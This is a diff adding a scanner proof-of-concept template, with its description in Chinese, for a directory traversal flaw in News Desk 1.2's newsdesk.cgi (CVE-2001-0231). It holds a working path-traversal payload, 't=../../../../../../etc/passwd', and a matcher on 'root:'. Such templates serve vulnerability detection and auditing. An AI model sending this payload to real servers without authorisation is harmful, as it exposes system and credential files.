@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "通过向 newsdesk.cgi 的 t 参数发送包含 ../ 路径穿越序列的请求，验证是否存在目录遍历漏洞，可尝试读取服务器敏感文件如 /etc/passwd。"
+id = "POC-AVE-2001-0670"
+name = "News Desk 1.2 目录遍历任意文件读取漏洞 PoC"
+severity = "medium"
+tags = ["ave-2001-0670"]
+vuln_id = [
+    "CVE-2001-0231",
+    "AVE-2001-0670",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/newsdesk.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "t=../../../../../../etc/passwd"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
